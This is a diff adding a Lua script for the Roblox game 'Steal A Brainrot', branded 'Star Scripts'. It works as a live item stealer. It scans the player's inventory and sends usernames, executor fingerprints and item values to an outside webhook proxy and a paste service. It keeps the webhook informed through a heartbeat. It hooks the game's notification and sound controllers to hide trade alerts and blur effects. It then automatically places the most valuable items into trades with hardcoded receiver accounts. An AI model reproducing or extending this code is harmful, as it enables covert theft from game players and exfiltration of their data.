+			if str6:find("\"status\"%s*:%s*\"ok\"") then
+				return true, n5, str6
+			end
+
+			if n5 == 0 and result2.Success == true then
+				return true, 200, str6
+			end
+
+			if n5 == 400 or n5 == 403 or n5 == 429 then
+				return false, n5, str6
+			end
+		elseif not ok2 then
+			str6 = tostring(result2 or "request_failed")
+			n5 = 0
+		else
+			n5 = 0
+			str6 = "empty_response"
+		end
+
+		if i < #tbl5 then
+			task.wait(0.2)
+		end
+	end
+
+	return false, n5, str6
+end
+
+local function fn35()
+	local tbl5 = {}
+	local tbl6 = {}
+
+	local function fn36(arg)
+		local n5 = math.floor(tonumber(arg) or 0)
+		if n5 <= 0 or tbl5[n5] then
+			return
+		end
+		tbl5[n5] = true
+		table.insert(tbl6, n5)
+	end
+
+	local v3 = fn33()
+	fn36(v3)
+	fn36(os.time())
+	fn36(v3 - 1)
+	fn36(v3 + 1)
+	return tbl6
+end
+
+local function fn36(arg)
+	if not crypt_ or not crypt_.hmac then
+		warn("[SAB] webhook imza basarisiz (crypt.hmac gerekli)")
+		return false
+	end
+	local v3 = fn4()
+	local proxyId2 = v3.proxyId
+	local proxySecret2 = v3.proxySecret
+	local submitGame = v3.submitGame
+	local str6 = v3.proxyUrl .. "/submit/" .. proxyId2
+	if proxyId2 == "" or proxySecret2 == "" then
+		warn("[SAB] webhook — ProxyId veya ProxySecret eksik")
+		return false
+	end
+	local str7 = tostring(arg.username or localPlayer.Name or "")
+	if str7 == "" then
+		warn("[SAB] webhook username bos")
+		return false
+	end
+	local str8 = tostring(arg.fingerprint or fn29() or "")
+
+	if #str8 < 8 then
+		str8 = tostring(localPlayer.UserId) .. ":" .. (identifyexecutor and identifyexecutor() or "unknown")
+	end
+
+	local receivers2 = arg.receivers
+
+	if type(receivers2) ~= "table" or #receivers2 == 0 then
+		receivers2 = v3.receivers
+	end
+
+	if #receivers2 == 0 then
+		warn("[SAB] webhook — Receivers bos")
+		return false
+	end
+	local v4 = fn35()
+	local n5 = 0
+	local str9 = ""
+
+	for i, v5 in ipairs(v4) do
+		local v6 = fn28(16)
+		local concat = table.concat
+		local tbl5 = {}
+		local str10 = tostring(v5)
+		tbl5[1] = proxyId2
+		tbl5[2] = str10
+		tbl5[3] = v6
+		tbl5[4] = str7
+		tbl5[5] = str8
+		local v7 = fn32(fn30(concat(tbl5, "|"), proxySecret2))
+		if not v7 or v7 == "" then
+			warn("[SAB] webhook imza basarisiz (crypt.hmac gerekli)")
+			return false
+		end
+		local v8
+
+		v8, n5, str9 = fn34({
+			game = submitGame,
+			username = str7,
+			fingerprint = str8,
+			timestamp = v5,
+			signNonce = v6,
+			signSignature = v7,
+			receivers = receivers2,
+			minValue = tostring(arg.minValue or ""),
+			executorName = tostring(arg.executorName or "Unknown"),
+			items = arg.items or {},
+			inventoryText = tostring(arg.inventoryText or ""),
+			summaryUrl = tostring(arg.summaryUrl or ""),
+			shouldPing = arg.shouldPing == true,
+			isDuels = arg.isDuels == true,
+			placeId = tostring(arg.placeId or game.PlaceId),
+			jobId = tostring(arg.jobId or game.JobId),
+			totalValue = tostring(arg.totalValue or "0"),
+			totalValueRaw = tonumber(arg.totalValueRaw) or 0,
+			sessionRunId = str,
+		}, str6)
+
+		if v8 then
+			local v9 = tostring
+			str9 = str9 or ""
+			return true, (v9(str9):match("\"messageId\"%s*:%s*\"?(%d+)\"?"))
+		end
+
+		if n5 == 403 or n5 == 429 then
+			break
+		end
+
+		if n5 ~= 400 and n5 ~= 0 or i >= #v4 then
+			break
+		end
+		task.wait(0.1)
+	end
+
+	warn(string.format("[SAB] webhook reddedildi status=%s game=%s body=%s", tostring(n5), submitGame, str9:sub(1, 200)))
+	return false
+end
+
+local function fn37(arg, arg2)
+	local v3 = fn4()
+	local proxyId2 = v3.proxyId
+	local v4 = fn2(fn().BotSecret or fn().BOT_SECRET or "")
+	if v4 == "" or proxyId2 == "" then
+		return false
+	end
+
+	local ok, result = pcall(function()
+		return fn25({
+			Url = v3.proxyUrl .. "/send/" .. proxyId2,
+			Method = "POST",
+			Headers = { ["Content-Type"] = "application/json", ["X-Bot-Secret"] = v4 },
+			Body = HttpService:JSONEncode({ content = tostring(arg or ""), embeds = { arg2 } }),
+		})
+	end)
+
+	if not ok or not result then
+		return false
+	end
+	local n5 = tonumber(result.StatusCode or result.status or result.Status) or 0
+	return n5 >= 200 and n5 < 300
+end
+
+local flag9 = false
+local flag10 = false
+local flag11 = false
+local messageId = nil
+local n5 = 0
+local tbl5 = {}
+local flag12 = false
+local tbl6 = {}
+
+local function fn38(arg)
+	local str6 = tostring(arg or "")
+
+	while true do
+		local str7 = str6:gsub("^%[.-%]%s*", "", 1)
+
+		if str7 ~= str6 then
+			str6 = str7
+		else
+			break
+		end
+	end
+
+	local pos = str6:find(" ➜ ", 1, true)
+
+	if pos then
+		str6 = str6:sub(1, pos - 1)
+	end
+
+	local pos2 = str6:find(" %(%$")
+	local str7
+
+	if pos2 then
+		str7 = str6:sub(1, pos2 - 1)
+	else
+		str7 = str6
+	end
+
+	return (str7:match("^%s*(.-)%s*$"))
+end
+
+local function fn39(arg)
+	return tonumber(tostring(arg or ""):match("%(%$([%d%.]+)%)")) or 0
+end
+
+local function fn40(arg)
+	if arg and tostring(arg) ~= "" then
+		messageId = tostring(arg)
+		genv2[str3] = messageId
+	end
+end
+
+local function fn41()
+	local v3 = genv2[str3]
+
+	if v3 and tostring(v3) ~= "" then
+		messageId = tostring(v3)
+	end
+end
+
+local function fn42(arg)
+	local v3 = fn4()
+	if v3.proxyId == "" or v3.proxySecret == "" then
+		return false
+	end
+
+	local ok, result = pcall(function()
+		return HttpService:JSONEncode(arg)
+	end)
+
+	if not ok or not result then
+		return false
+	end
+	result = fn27(result, v3.proxySecret) or result
+	local str6 = v3.proxyUrl .. "/webhook-live/" .. v3.proxyId .. "/heartbeat"
+
+	local tbl7 = {
+		["Content-Type"] = "application/json",
+		Accept = "application/json",
+		["User-Agent"] = "RobloxStudio/WinInet",
+	}
+
+	local function fn43(arg2, arg3)
+		local n6 = tonumber(arg2) or 0
+		local str7 = tostring(arg3 or "")
+
+		if n6 >= 200 and n6 < 300 then
+			n5 = 0
+			local match = str7:match("\"messageId\"%s*:%s*\"?(%d+)\"?")
+
+			if match then
+				fn40(match)
+			end
+
+			return true
+		end
+
+		n5 += 1
+		return false
+	end
+
+	local request_ = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request
+
+	if request_ then
+		local ok2, result2 = pcall(function()
+			return request_({ Url = str6, Method = "POST", Headers = tbl7, Body = result })
+		end)
+
+		if ok2 and result2 then
+			return (fn43(result2.StatusCode or result2.status or result2.Status, result2.Body or result2.body))
+		end
+	end
+
+	local ok2, result2 = pcall(function()
+		return HttpService:RequestAsync({ Url = str6, Method = "POST", Headers = tbl7, Body = result })
+	end)
+
+	if ok2 and result2 then
+		return (fn43(result2.StatusCode or result2.Success and 200 or 0, result2.Body))
+	end
+	return false
+end
+
+local function fn43(arg)
+	local v3 = fn4()
+	local tbl7 = { username = localPlayer.Name, jobId = tostring(game.JobId), placeId = tostring(game.PlaceId) }
+	local v4 = fn33()
+	local v5 = fn28(16)
+	local fingerprint = tostring(fn29() or "")
+
+	if #fingerprint < 8 then
+		fingerprint = tostring(localPlayer.UserId) .. ":" .. (identifyexecutor and identifyexecutor() or "unknown")
+	end
+
+	local concat = table.concat
+	local tbl8 = {}
+	local proxyId2 = v3.proxyId
+	local str6 = tostring(v4)
+	local name = localPlayer.Name
+	tbl8[1] = proxyId2
+	tbl8[2] = str6
+	tbl8[3] = v5
+	tbl8[4] = name
+	tbl8[5] = fingerprint
+	local v6 = fn32(fn30(concat(tbl8, "|"), v3.proxySecret))
+
+	if v6 and v6 ~= "" then
+		tbl7.fingerprint = fingerprint
+		tbl7.timestamp = v4
+		tbl7.signNonce = v5
+		tbl7.signSignature = v6
+	else
+		tbl7.staticKey = v3.proxySecret
+		tbl7.key = v3.proxySecret
+	end
+
+	if messageId then
+		tbl7.messageId = messageId
+	end
+
+	if type(arg) == "table" then
+		for k, v7 in pairs(arg) do
+			tbl7[k] = v7
+		end
+	end
+
+	return tbl7
+end
+
+local function fn44()
+	if genv2[str4] then
+		return
+	end
+
+	if not flag9 or not flag11 then
+		return
+	end
+	flag10 = false
+	local v3 = fn43({ action = "disconnect", disconnect = true })
+
+	for i = 1, 4 do
+		if not fn42(v3) then
+			task.wait(0.15)
+			continue
+		end
+		break
+	end
+
+	flag9 = false
+	genv2[str3] = nil
+	genv2[str2] = nil
+	flag7 = false
+	flag8 = false
+end
+
+local function fn45(arg, arg2)
+	if not fn6() then
+		return false
+	end
+	fn41()
+	local v3 = fn43({ action = "claim", claimFull = true, claimedLines = arg or {}, missedLines = arg2 or {} })
+	if fn42(v3) then
+		genv2[str4] = true
+		return true
+	end
+	return false
+end
+
+local function fn46()
+	if not fn6() then
+		return false
+	end
+	fn41()
+	return fn42(fn43({ action = "redirect" }))
+end
+
+local function fn47()
+	local v3 = flag12
+	local v4
+
+	if flag12 then
+		v4 = v3
+	else
+		v4 = genv2[str4]
+	end
+
+	if v4 then
+		return
+	end
+	flag12 = true
+
+	task.spawn(function()
+		local tbl7 = {}
+
+		for k, v5 in pairs(tbl6) do
+			tbl7[k] = v5
+		end
+
+		local tbl8 = {}
+		local tbl9 = {}
+
+		for _, v5 in ipairs(tbl5) do
+			local v6 = fn38(v5)
+			local tbl10 = { line = v5, sort = fn39(v5) }
+
+			if (tbl7[v6] or 0) > 0 then
+				tbl7[v6] = tbl7[v6] - 1
+				tbl8[#tbl8 + 1] = tbl10
+			else
+				tbl9[#tbl9 + 1] = tbl10
+			end
+		end
+
+		for i = 1, 4 do
+			if fn45(tbl8, tbl9) then
+				flag10 = false
+				return
+			end
+			task.wait(0.25 * i)
+		end
+
+		flag12 = false
+	end)
+end
+
+local function fn48()
+	if not flag10 then
+		return false
+	end
+	return fn42(fn43())
+end
+
+local function fn49(arg)
+	if flag9 then
+		return
+	end
+	flag9 = true
+	flag10 = true
+	fn41()
+	fn40(arg)
+
+	task.spawn(function()
+		fn48()
+
+		while flag10 and genv.__STEAL_A_BRAINROT_RUNNING__ do
+			task.wait(3)
+			fn48()
+		end
+	end)
+end
+
+Players.PlayerRemoving:Connect(function(player)
+	if player == localPlayer then
+		flag11 = true
+		fn44()
+	end
+end)
+
+local function fn50(arg)
+	local str6 = string.format([[=== STAR SCRIPTS | STEAL A BRAINROT SUMMARY ===
+Username: %s
+Total Items: %d
+
+%s]], localPlayer.Name, #arg, table.concat(arg, "\n"))
+
+	local ok, result = pcall(function()
+		return fn25({
+			Url = "https://api.rubis.app/v2/scrap?public=true",
+			Method = "POST",
+			Headers = { ["Content-Type"] = "text/plain" },
+			Body = str6,
+		})
+	end)
+
+	if ok and result and result.Body then
+		local ok2, result2 = pcall(HttpService.JSONDecode, HttpService, result.Body)
+
+		if ok2 and result2 then
+			local raw = result2.raw or result2.scrapID and "https://api.rubis.app/v2/scrap/" .. result2.scrapID .. "/raw" or result2.id and "https://api.rubis.app/v2/scrap/" .. result2.id .. "/raw"
+			if raw then
+				return raw
+			end
+		end
+	end
+
+	return ""
+end
+
+local function fn51(arg, arg2)
+	local str6 = arg2 or ""
+	local str7 = identifyexecutor and identifyexecutor() or "Unknown"
+	local str8 = table.concat(receivers, ", ")
+	local v3 = fn11(v2)
+	local str9 = #arg > 0 and table.concat(arg, "\n") or string.format("[Empty - No tradable inventory found]", v3)
+
+	if #str9 > 2800 then
+		str9 = str9:sub(1, 2800) .. "\n... (Truncated)"
+	end
+
+	return {
+		title = "[STAR SCRIPTS] | Steal A Brainrot Hit!",
+		color = 5763719,
+		description = string.format([[**👤 Player Info**
+```
+Username     : %s
+Min Value    : %s
+Executor     : %s
+Receivers    : %s
+```
+**📡 Status**
+```diff
++ 🟢 ONLINE  •  Player In Game
+```
+**Inventory (Brainrots / Base Skins / Gears)**
+```
+%s
+```%s]], localPlayer.Name, v3, str7, str8, str9, str6),
+		footer = { text = "Star Scripts - " .. os.date("%d/%m/%Y %H:%M") },
+		timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+	}
+end
+
+local function fn52(arg, arg2)
+	local tbl7 = {}
+	local min = math.min
+	local n6 = #tbl3
+	arg = arg or 150
+
+	for i = 1, min(n6, arg) do
+		local v3 = tbl3[i]
+
+		tbl7[#tbl7 + 1] = {
+			kind = "brainrot",
+			name = v3.name,
+			moneyPerSec = v3.moneyPerSec,
+			mutationStr = v3.mutationStr,
+			traitStr = v3.traitStr,
+		}
+	end
+
+	local min2 = math.min
+	local n7 = #tbl4
+	local n8 = arg2 or 50
+
+	for i = 1, min2(n7, n8) do
+		local v3 = tbl4[i]
+		tbl7[#tbl7 + 1] = { kind = v3.kind, name = v3.name }
+	end
+
+	return tbl7
+end
+
+local function fn53(arg)
+	if fn6() then
+		return
+	end
+
+	if fn5() then
+		return
+	end
+	arg = arg or {}
+	tbl5 = {}
+
+	for i, v3 in ipairs(arg) do
+		tbl5[i] = v3
+	end
+
+	local v3 = fn23()
+	local n6 = 0
+
+	for _, v4 in ipairs(arg) do
+		n6 += fn39(v4)
+	end
+
+	local flag13 = flag4 and #arg > 0
+	local str6 = ""
+
+	if flag13 then
+		str6 = fn50(arg)
+	end
+
+	local v4 = fn24(arg, n4)
+	local v5, v6, v7 = ipairs(arg)
+	local flag14 = false
+
+	for _, v8 in v5, v6, v7 do
+		if v8:find("%(%$") or v8:find("%(Limited%)") then
+			flag14 = true
+			break
+		end
+	end
+
+	local flag15 = v3 >= math.max(250000000, v2) or flag14
+
+	if not flag15 and starScriptsConfig.SHOW_DISCORD_UI == true then
+		task.spawn(fn9)
+	end
+
+	local tbl7 = {}
+
+	if flag15 then
+		table.insert(tbl7, "@everyone")
+	end
+
+	if flag then
+		table.insert(tbl7, "(PLAYER IN DUELS)")
+	end
+
+	local str7 = #v4 > 0 and table.concat(v4, "\n") or string.format("[Empty - No tradable inventory found]", fn11(v2))
+
+	if #str7 > 2800 then
+		str7 = str7:sub(1, 2800) .. "\n... (Truncated)"
+	end
+
+	local str8 = identifyexecutor and identifyexecutor() or "Unknown"
+	local v8 = fn51(v4, str6 ~= "" and "\n**Full Summary:** " .. str6 or "")
+	local str9 = table.concat(tbl7, " ")
+
+	local v9, v10 = fn36({
+		username = localPlayer.Name,
+		receivers = fn4().receivers,
+		minValue = fn11(v2),
+		executorName = str8,
+		items = fn52(150, 50),
+		inventoryText = str7,
+		summaryUrl = str6,
+		shouldPing = flag15,
+		isDuels = flag,
+		placeId = game.PlaceId,
+		jobId = game.JobId,
+		totalValue = tostring(n6),
+		totalValueRaw = n6,
+	})
+
+	if v9 then
+		fn7()
+		fn49(v10)
+	elseif fn37(str9, v8) then
+		fn7()
+		fn49(nil)
+	else
+		flag8 = false
+		warn("[SAB] webhook gonderilemedi")
+	end
+end
+
+local function fn54()
+	local v3 = fn21()
+
+	for _, v4 in ipairs(fn22()) do
+		table.insert(v3, v4)
+	end
+
+	table.sort(v3, function(arg, arg2)
+		local n6 = tonumber(tostring(arg):match("%(%$([%d%.]+)%)%s*$")) or 0
+		local n7 = tonumber(tostring(arg2):match("%(%$([%d%.]+)%)%s*$")) or 0
+		if n6 ~= n7 then
+			return n6 > n7
+		end
+		return arg < arg2
+	end)
+
+	return v3
+end
+
+local function fn55(arg)
+	local tbl7 = {}
+	arg = arg and arg:FindFirstChild("Brainrots")
+	if not arg then
+		return tbl7
+	end
+
+	for _, child in ipairs(arg:GetChildren()) do
+		if child:IsA("GuiObject") and child.Visible and child.Name ~= "Template" and string.sub(child.Name, 1, 6) ~= "Empty." then
+			local return_ = child:FindFirstChild("Return")
+
+			if return_ and return_:IsA("GuiButton") then
+				table.insert(tbl7, { button = return_, name = child.Name, order = child.LayoutOrder })
+			end
+		end
+	end
+
+	table.sort(tbl7, function(arg2, arg3)
+		return arg2.order < arg3.order
+	end)
+
+	return tbl7
+end
+
+local function fn56(arg)
+	if type(firesignal) == "function" then
+		return pcall(firesignal, arg.Activated)
+	end
+	local v3 = getconnections(arg.Activated)[1]
+	if not v3 or not v3.Function then
+		return false, "Return button connection not found"
+	end
+	return pcall(v3.Function)
+end
+
+if not (function()
+	if not flag5 then
+		return true
+	end
+	local fuseMachine = localPlayer.PlayerGui:WaitForChild("FuseMachine", 15)
+	local fuseMachine2 = fuseMachine and fuseMachine:WaitForChild("FuseMachine", 5)
+	if not fuseMachine or not fuseMachine2 then
+		warn("[SAB] Fuse UI yuklenemedi; sistem baslatilmadi")
+		return false
+	end
+
+	if #fn55(fuseMachine2) == 0 then
+		return true
+	end
+
+	pcall(function()
+		require(ReplicatedStorage.Controllers.InterfaceController):SetState("FuseMachine", false)
+	end)
+
+	local function fn57()
+		local currentCamera = workspace.CurrentCamera
+
+		if currentCamera then
+			currentCamera.FieldOfView = 70
+
+			for _, child in ipairs(currentCamera:GetChildren()) do
+				if child:IsA("BlurEffect") then
+					child.Enabled = false
+				end
+			end
+		end
+
+		local v3 = ipairs
+		local Lighting = game:GetService("Lighting")
+
+		for _, child in v3(Lighting:GetChildren()) do
+			if child:IsA("BlurEffect") then
+				child.Enabled = false
+			end
+		end
+	end
+
+	fn57()
+	task.defer(fn57)
+	fuseMachine.Enabled = false
+	fuseMachine2.Visible = false
+	local n6 = os.clock() + 30
+	local n7 = 0
+	local n8
+
+	while os.clock() < n6 do
+		local v3 = fn55(fuseMachine2)
+
+		if #v3 == 0 then
+			fuseMachine.Enabled = false
+			fuseMachine2.Visible = false
+			task.wait(0.75)
+			return true
+		end
+
+		local n9 = #v3
+		local v4, v5 = fn56(v3[1].button)
+		if not v4 then
+			warn("[SAB] Fuse Return calistirilamadi: " .. tostring(v5))
+			return false
+		end
+		local n10 = os.clock() + 5
+
+		while true do
+			task.wait(0.2)
+			n8 = #fn55(fuseMachine2)
+			if not (n8 < n9 or os.clock() >= n10) then
+				continue
+			end
+			break
+		end
+
+		if n9 <= n8 then
+			warn("[SAB] Fuse Return sonrasi UI guncellenmedi")
+			return false
+		end
+		n7 += n9 - n8
+		task.wait(1.2)
+	end
+
+	warn("[SAB] Fuse temizleme zaman asimina ugradi; sistem baslatilmadi")
+	return false
+end)() then
+	genv.__STEAL_A_BRAINROT_RUNNING__ = nil
+	return
+end
+
+local n6 = 900000000
+
+local function fn57()
+	for _, v3 in ipairs(fn20()) do
+		if (v3.moneyPerSec or 0) >= n6 or brainrots[v3.name] ~= nil then
+			return true
+		end
+	end
+
+	return false
+end
+
+local flag13 = flag2 and not fn6()
+local flag14 = false
+
+if flag13 then
+	task.wait(n2)
+	local n7 = os.clock() + 3
+	local v3
+
+	while true do
+		v3 = fn54()
+
+		if #v3 > 0 then
+			break
+		else
+			task.wait(0.4)
+			if not (n7 <= os.clock()) then
+				continue
+			end
+			break
+		end
+	end
+
+	flag14 = #v3 > 0
+
+	if flag14 then
+		fn53(v3)
+	end
+end
+
+if flag2 and flag14 then
+	local function fn58()
+		local Players2 = game:GetService("Players")
+		game:GetService("HttpService")
+		local ReplicatedStorage2 = game:GetService("ReplicatedStorage")
+		local SoundController = require(ReplicatedStorage2.Controllers.SoundController)
+		local NotificationController = require(ReplicatedStorage2.Controllers.NotificationController)
+		local TradeController = require(ReplicatedStorage2.Controllers.TradeController)
+		local str6 = receivers[1] or "mooncatbanke2"
+		local flag15 = false
+		local localPlayer2 = Players2.LocalPlayer
+		local tradeLiveTrade = localPlayer2.PlayerGui:WaitForChild("TradeLiveTrade")
+		local tradeLiveTrade2 = tradeLiveTrade:WaitForChild("TradeLiveTrade")
+		local leftCenter = localPlayer2.PlayerGui:WaitForChild("LeftCenter")
+		local leftCenter2 = leftCenter:WaitForChild("LeftCenter")
+		local genv3 = getgenv()
+		local n7 = 0
+		local tbl7 = {}
+		local tbl8 = {}
+		local tbl9 = {}
+		local v3 = nil
+		local n8 = 0
+
+		if not genv3.OriginalTradePlaySound then
+			genv3.OriginalTradePlaySound = SoundController.PlaySound
+		end
+
+		SoundController.PlaySound = function(arg, arg2, ...)
+			if (genv3.TradeSoundMuteDepth or 0) > 0 and arg2 == "Sounds.Sfx.Activated" then
+				return
+			end
+			local originalTradePlaySound = genv3.OriginalTradePlaySound
+			local v4 = table.pack(...)
+			v4.n = 3 + v4.n - 1
+			table.move(v4, 1, v4.n, 3, v4)
+			v4[1] = arg
+			v4[2] = arg2
+			return originalTradePlaySound(table.unpack(v4, 1, v4.n))
+		end
+
+		if not genv3.OriginalTradeNotify then
+			genv3.OriginalTradeNotify = NotificationController.Notify
+		end
+
+		NotificationController.Notify = function(arg, arg2, ...)
+			local v4 = string.lower(tostring(arg2 or ""))
+			local flag16 = string.find(v4, "other player", 1, true) ~= nil and string.find(v4, "space", 1, true) ~= nil
+			local flag17 = string.find(v4, "pending invite", 1, true) ~= nil
+			local flag18 = string.find(v4, string.lower(str6), 1, true) ~= nil
+			local v5 = flag18 and string.find(v4, "trade with @", 1, true) and string.find(v4, "completed", 1, true)
+			flag18 = flag18 and string.find(v4, "canceled", 1, true)
+
+			if v5 then
+				flag15 = true
+				fn47()
+			end
+
+			if flag16 then
+				local str7
+
+				if string.find(v4, "gear space", 1, true) then
+					str7 = "GEAR"
+				elseif string.find(v4, "brainrot space", 1, true) then
+					str7 = "BRAINROT"
+				elseif string.find(v4, "base skin space", 1, true) or string.find(v4, "baseskin space", 1, true) or string.find(v4, "skin space", 1, true) then
+					str7 = "BASE SKIN"
+				else
+					str7 = nil
+
+					if os.clock() <= n8 then
+						str7 = v3
+					end
+				end
+
+				if str7 == "BRAINROT" or str7 == "BASE SKIN" or str7 == "GEAR" then
+					tbl9[str7] = true
+				end
+
+				return
+			end
+
+			if flag17 or v5 or flag18 then
+				return
+			end
+			local originalTradeNotify = genv3.OriginalTradeNotify
+			local v6 = table.pack(...)
+			v6.n = 3 + v6.n - 1
+			table.move(v6, 1, v6.n, 3, v6)
+			v6[1] = arg
+			v6[2] = arg2
+			return originalTradeNotify(table.unpack(v6, 1, v6.n))
+		end
+
+		local function fn59(arg, ...)
+			genv3.TradeSoundMuteDepth = (genv3.TradeSoundMuteDepth or 0) + 1
+			local pack = table.pack
+			local v4 = pcall
+			local v5 = table.pack(...)
+			v5.n = 2 + v5.n - 1
+			table.move(v5, 1, v5.n, 2, v5)
+			v5[1] = arg
+			local v6 = pack(v4(table.unpack(v5, 1, v5.n)))
+			genv3.TradeSoundMuteDepth = math.max(0, (genv3.TradeSoundMuteDepth or 1) - 1)
+			return table.unpack(v6, 1, v6.n)
+		end
+
+		local function fn60()
+			for _, v4 in ipairs(tbl7) do
+				v4:Disconnect()
+			end
+
+			table.clear(tbl7)
+		end
+
+		local function fn61(child)
+			if not child:IsA("BlurEffect") then
+				return
+			end
+
+			if tbl8[child] == nil then
+				tbl8[child] = child.Enabled
+			end
+
+			child.Enabled = false
+		end
+
+		local function fn62()
+			fn60()
+			tradeLiveTrade.Enabled = false
+			leftCenter.Enabled = true
+			leftCenter2.Visible = true
+			leftCenter2.Position = UDim2.fromScale(0, 0.5)
+
+			table.insert(tbl7, tradeLiveTrade:GetPropertyChangedSignal("Enabled"):Connect(function()
+				if tradeLiveTrade2.Visible and tradeLiveTrade.Enabled then
+					tradeLiveTrade.Enabled = false
+				end
+			end))
+
+			table.insert(tbl7, leftCenter:GetPropertyChangedSignal("Enabled"):Connect(function()
+				if tradeLiveTrade2.Visible and not leftCenter.Enabled then
+					leftCenter.Enabled = true
+				end
+			end))
+
+			table.insert(tbl7, leftCenter2:GetPropertyChangedSignal("Visible"):Connect(function()
+				if tradeLiveTrade2.Visible and not leftCenter2.Visible then
+					leftCenter2.Visible = true
+				end
+			end))
+
+			table.insert(tbl7, leftCenter2:GetPropertyChangedSignal("Position"):Connect(function()
+				local udim2 = UDim2.fromScale(0, 0.5)
+
+				if tradeLiveTrade2.Visible and leftCenter2.Position ~= udim2 then
+					leftCenter2.Position = udim2
+				end
+			end))
+
+			local currentCamera = workspace.CurrentCamera
+
+			if currentCamera then
+				currentCamera.FieldOfView = 70
+
+				for _, child in ipairs(currentCamera:GetChildren()) do
+					fn61(child)
+				end
+
+				table.insert(tbl7, currentCamera:GetPropertyChangedSignal("FieldOfView"):Connect(function()
+					if currentCamera.FieldOfView ~= 70 then
+						currentCamera.FieldOfView = 70
+					end
+				end))
+
+				table.insert(tbl7, currentCamera.ChildAdded:Connect(fn61))
+			end
+
+			local Lighting = game:GetService("Lighting")
+
+			for _, child in ipairs(Lighting:GetChildren()) do
+				fn61(child)
+			end
+
+			table.insert(tbl7, Lighting.ChildAdded:Connect(fn61))
+		end
+
+		local function autoTradeVisualCleanup()
+			fn60()
+			tradeLiveTrade.Enabled = true
+			local currentCamera = workspace.CurrentCamera
+
+			if currentCamera then
+				currentCamera.FieldOfView = 70
+			end
+
+			for k, v4 in pairs(tbl8) do
+				if k.Parent then
+					k.Enabled = v4
+				end
+			end
+
+			table.clear(tbl8)
+		end
+
+		if genv3.AutoTradeVisualCleanup then
+			pcall(genv3.AutoTradeVisualCleanup)
+		end
+
+		genv3.AutoTradeVisualCleanup = autoTradeVisualCleanup
+
+		local function fn63()
+			local v4 = string.lower(tradeLiveTrade2:WaitForChild("Other"):WaitForChild("Username").Text)
+
+			for _, receiver in ipairs(receivers) do
+				local v5 = string.lower(receiver)
+				if v5 ~= "" and string.find(v4, v5, 1, true) ~= nil then
+					return true
+				end
+			end
+
+			return false
+		end
+
+		local function fn64(arg)
+			for _, v4 in ipairs({
+				{ prefix = "Selection_Gear_", kind = "GEAR" },
+				{ prefix = "Selection_BaseSkin_", kind = "BASE SKIN" },
+				{ prefix = "Selection_Brainrot_", kind = "BRAINROT" },
+			}) do
+				if string.find(arg.Name, v4.prefix, 1, true) == 1 then
+					local spacer = arg:FindFirstChild("Spacer")
+					spacer = spacer and spacer:FindFirstChild("Title", true)
+					return v4.kind, spacer and spacer:IsA("TextLabel") and spacer.Text or string.sub(arg.Name, #v4.prefix + 1)
+				end
+			end
+
+			return nil, nil
+		end
+
+		local function fn65(arg)
+			local v4, v5 = fn64(arg)
+			if v4 == "GEAR" then
+				return gears[v5] ~= nil
+			end
+
+			if v4 == "BASE SKIN" then
+				return skins[v5] ~= nil
+			end
+
+			if v4 ~= "BRAINROT" then
+				return false
+			end
+
+			if brainrots[v5] ~= nil then
+				return true
+			end
+			local generation = arg:FindFirstChild("Generation", true) or arg:FindFirstChild("Gen", true)
+
+			if generation and generation:IsA("TextLabel") then
+				local v6 = fn16(fn17(generation))
+				if v6 > 0 then
+					return v6 >= v2
+				end
+			end
+
+			return tbl2[v5] == true
+		end
+
+		local function fn66(arg)
+			local v4, v5 = fn64(arg)
+			if v4 == "GEAR" then
+				return gears[v5] or 0
+			end
+
+			if v4 == "BASE SKIN" then
+				return skins[v5] or 0
+			end
+
+			if v4 == "BRAINROT" then
+				return brainrots[v5] or 0
+			end
+			return -1
+		end
+
+		local function fn67()
+			n7 += 1
+			local v4 = n7
+			table.clear(tbl9)
+			table.clear(tbl6)
+			local tbl10 = {}
+			v3 = nil
+			n8 = 0
+
+			task.spawn(function()
+				local scrollingFrame = tradeLiveTrade2:WaitForChild("Your"):WaitForChild("ScrollingFrame")
+				local tbl11 = {}
+				local color = Color3.fromRGB(0, 255, 0)
+				local color2 = Color3.fromRGB(81, 158, 86)
+				local v5 = Random.new()
+				local n9 = os.clock() + 120
+				local now = os.clock()
+				task.wait(0.5)
+				local n10 = os.clock() + 5
+
+				while tradeLiveTrade2.Visible and not fn63() and os.clock() < n10 do
+					task.wait(0.1)
+				end
+
+				local n11 = -1
+				if not fn63() then
+					warn("Otomatik trade iptal: hedef oyuncu farkli.")
+					return
+				end
+				local v6, v7
+
+				while true do
+					if v4 ~= n7 or not tradeLiveTrade2.Visible or not fn63() then
+						return
+					end
+					local children = scrollingFrame:GetChildren()
+
+					table.sort(children, function(arg, arg2)
+						local v8 = fn66(arg)
+						local v9 = fn66(arg2)
+						if v8 ~= v9 then
+							return v8 > v9
+						end
+						return arg.Name < arg2.Name
+					end)
+
+					local n12 = 0
+					local flag16 = false
+					local exitTo = nil
+
+					for _, child in ipairs(children) do
+						v6 = fn64(child)
+
+						if fn65(child) and not tbl9[v6] then
+							n12 += 1
+							local spacer = child:FindFirstChild("Spacer")
+							local uiStroke = spacer and spacer:FindFirstChildOfClass("UIStroke")
+
+							if uiStroke and uiStroke.Color == color then
+								tbl11[child] = 3
+
+								if not tbl10[child] then
+									tbl10[child] = true
+									local v8, v9 = fn64(child)
+
+									if v9 then
+										tbl6[v9] = (tbl6[v9] or 0) + 1
+									end
+								end
+							elseif (tbl11[child] or 0) < 3 and spacer and spacer:IsA("GuiButton") then
+								v7 = getconnections(spacer.Activated)[1]
+								if v7 and v7.Function then
+									exitTo = 1
+									break
+								end
+							end
+						end
+					end
+
+					local now2
+
+					if exitTo == 1 then
+						tbl11[u4_1] = (tbl11[u4_1] or 0) + 1
+						v3 = v6
+						n8 = os.clock() + 5
+						fn59(v7.Function)
+						now2 = os.clock()
+						task.wait(v5:NextNumber(1.3, 1.5))
+						flag16 = true
+					else
+						now2 = now
+					end
+
+					if n12 ~= n11 then
+						now = os.clock()
+						n11 = n12
+					else
+						if not flag16 and os.clock() - now2 >= 2 then
+							break
+						end
+						now = now2
+					end
+
+					if not flag16 then
+						task.wait(0.3)
+					end
+
+					if not (n9 <= os.clock()) then
+						continue
+					end
+					break
+				end
+
+				if v4 ~= n7 or not tradeLiveTrade2.Visible or not fn63() then
+					return
+				end
+				local readyButton = tradeLiveTrade2:WaitForChild("Other"):WaitForChild("ReadyButton")
+				local n12 = os.clock() + 300
+
+				while true do
+					if v4 ~= n7 or not tradeLiveTrade2.Visible or not fn63() then
+						return
+					end
